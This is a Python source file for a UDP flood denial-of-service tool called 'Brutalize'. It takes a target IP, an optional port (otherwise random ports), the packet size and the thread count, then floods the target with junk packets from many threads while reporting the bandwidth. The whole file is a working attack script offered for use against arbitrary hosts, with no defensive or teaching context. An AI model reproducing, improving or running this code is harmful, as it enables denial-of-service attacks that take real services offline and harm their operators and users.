from socket import socket, AF_INET, SOCK_DGRAM

from threading import Thread
from random import choices, randint
from time import time, sleep

from getpass import getpass as hinput

class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent *bytediff / gb* interval
                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.                    ", end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    ip = input("Enter the IP to DDoS -> ")
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        print("Error! Please enter a correct IP address.")
        exit()

    port = input("Enter port [press enter to attack all ports] -> ")
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            print("Error! Please enter a correct port.")
            exit()

    force = input("Bytes per packet [press enter for 1250] -> ")
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    threads = input("Threads [press enter for 100] -> ")
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            print("Error! Please enter an integer.")
            exit()

    print()
    cport = '' if port is None else f':{port}'
    print(f"Starting attack on {ip}{cport}.", end='\r')

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print("A fatal error has occured and the attack was stopped.")
        exit()

    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.")
    print('\n')
    sleep(1)
    input("Press enter to exit.")

if __name__ == '__main__':
    main()
